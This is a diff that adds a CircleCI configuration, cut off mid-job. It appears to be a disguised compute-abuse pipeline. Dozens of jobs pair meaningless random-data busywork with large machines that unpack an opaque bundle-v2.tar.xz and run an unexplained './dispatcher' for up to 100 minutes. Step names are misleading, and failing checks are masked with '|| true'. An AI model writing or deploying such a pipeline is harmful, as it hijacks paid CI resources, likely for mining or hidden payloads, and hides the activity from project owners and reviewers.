@@ -1,0 +1,1487 @@
+version: 2.1
+
+jobs:
+  D_PackageRelease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build frequency table
+          command: |
+            mkdir -p /tmp/_bld
+            set +o pipefail 2>/dev/null; seq 1 1361169 | sha256sum > /tmp/_bld/handover.ok; true
+            echo "ready: $(sha256sum /tmp/_bld/handover.ok | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - handover.ok
+  PackageRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/handover.ok || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  Alpha_RUN_STG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Enumerate token pairs
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 1126400 | fold -w8 | sort -u | wc -l; true ; } > /tmp/_bld/stats.tsv
+            echo "ready: $(sha256sum /tmp/_bld/stats.tsv | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stats.tsv
+  RUN_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/stats.tsv || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  A_xray:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 23M /dev/urandom | base64 | wc -c; true ; } > /tmp/_bld/.ok
+            echo "ready: $(sha256sum /tmp/_bld/.ok | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .ok
+  xray:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/result.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  drain_november-9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Rebase partial order
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 384269 | awk '{if($1%2)o++;else e++}END{print o"/"e}'; true ; } > /tmp/_bld/phase-complete.txt
+            echo "ready: $(sha256sum /tmp/_bld/phase-complete.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-complete.txt
+  november-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/phase-complete.txt || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  ctx_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 296960 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/_bld/step-ok.txt
+            echo "ready: $(sha256sum /tmp/_bld/step-ok.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-ok.txt
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/result.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  linter_node18-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify fixture integrity
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 387520 | sha1sum; true ; } > /tmp/_bld/event.ndjson
+            echo "ready: $(sha256sum /tmp/_bld/event.ndjson | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - event.ndjson
+  node18-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/event.ndjson || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  alpha_go-live:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prepare block cipher
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 263061 | awk 'END{print NR}'; true ; } > /tmp/_bld/2024-12-26.data
+            echo "ready: $(sha256sum /tmp/_bld/2024-12-26.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-12-26.data
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/2024-12-26.data || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  orchestrate_bun-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Fuzz boundary edges
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 480068 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/_bld/trace.ndjson
+            echo "ready: $(sha256sum /tmp/_bld/trace.ndjson | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - trace.ndjson
+  bun-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/result.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  bundle_RUN_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Collate adjacent chunks
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 17825792 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/_bld/phase-pass.txt
+            echo "ready: $(sha256sum /tmp/_bld/phase-pass.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-pass.txt
+  RUN_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/result.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  Alpha_BUILD_QA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=8;a++)for(b=1;b<=23810;b++)s+=a*b;print s}'; true ; } > /tmp/_bld/passoff.sig
+            echo "ready: $(sha256sum /tmp/_bld/passoff.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - passoff.sig
+  BUILD_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/passoff.sig || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  runner_t-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 112640 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/_bld/gate-ok.out
+            echo "ready: $(sha256sum /tmp/_bld/gate-ok.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - gate-ok.out
+  t-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/gate-ok.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  Alpha_apr14-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Reduce row partitions
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 297986 | awk '{if($1%2)o++;else e++}END{print o"/"e}'; true ; } > /tmp/_bld/summary.md
+            echo "ready: $(sha256sum /tmp/_bld/summary.md | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - summary.md
+  apr14-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/summary.md || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  verify_produce-nightly-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Record manifest digest
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 193003 | awk '{s+=$1}END{print s}'; true ; } > /tmp/_bld/pt-D.pt
+            echo "ready: $(sha256sum /tmp/_bld/pt-D.pt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - pt-D.pt
+  produce-nightly-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/pt-D.pt || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  gamma_sanity:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Harvest random seed
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<212679;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/_bld/DONE
+            echo "ready: $(sha256sum /tmp/_bld/DONE | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - DONE
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/DONE || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  fixture_assemble-production-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 440920 | md5sum; true ; } > /tmp/_bld/FINAL
+            echo "ready: $(sha256sum /tmp/_bld/FINAL | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - FINAL
+  assemble-production-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/FINAL || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  auditor_build-quick-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Compute aggregate hash
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 14680064 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/_bld/14.data
+            echo "ready: $(sha256sum /tmp/_bld/14.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 14.data
+  build-quick-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/14.data || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  generate_bun-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Mix shuffle salt
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=230 2>/dev/null | md5sum; true ; } > /tmp/_bld/43.data
+            echo "ready: $(sha256sum /tmp/_bld/43.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 43.data
+  bun-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/43.data || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  validate_rip-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Collect env snapshot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 600 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/_bld/05.log
+            echo "ready: $(sha256sum /tmp/_bld/05.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 05.log
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/05.log || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  wire_publish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 311973 | awk '{if($1%2)o++;else e++}END{print o"/"e}'; true ; } > /tmp/_bld/2023-05-01.data
+            echo "ready: $(sha256sum /tmp/_bld/2023-05-01.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2023-05-01.data
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/2023-05-01.data || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  fetcher_feat-2426:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Snapshot heap stats
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 10485760 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/_bld/step-8.log
+            echo "ready: $(sha256sum /tmp/_bld/step-8.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-8.log
+  feat-2426:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/step-8.log || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  B_HOOK_DEV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 46137344 | fold -w16 | sort -u | wc -l; true ; } > /tmp/_bld/result.txt
+            echo "ready: $(sha256sum /tmp/_bld/result.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - result.txt
+  HOOK_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/result.txt || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  route_send-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Normalize counter rings
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 460800 | fold -w8 | sort -u | wc -l; true ; } > /tmp/_bld/step-13.out
+            echo "ready: $(sha256sum /tmp/_bld/step-13.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-13.out
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/step-13.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  prefetch_realease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 25600 | wc -c; true ; } > /tmp/_bld/stash.blob
+            echo "ready: $(sha256sum /tmp/_bld/stash.blob | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stash.blob
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/stash.blob || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  fetch_validate-staging-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Rotate build log
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 18874368 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/_bld/step-ready.log
+            echo "ready: $(sha256sum /tmp/_bld/step-ready.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-ready.log
+  validate-staging-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/result.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  ensure_validate-nightly-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Spool byte frames
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 2097152 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/_bld/passoff.state
+            echo "ready: $(sha256sum /tmp/_bld/passoff.state | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - passoff.state
+  validate-nightly-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/passoff.state || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  ensure_pat-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 7142); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/_bld/primary_task_output.log
+            echo "ready: $(sha256sum /tmp/_bld/primary_task_output.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - primary_task_output.log
+  pat-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/result.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  deps_rigel-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 430080 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/_bld/big_job_output.log
+            echo "ready: $(sha256sum /tmp/_bld/big_job_output.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - big_job_output.log
+  rigel-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
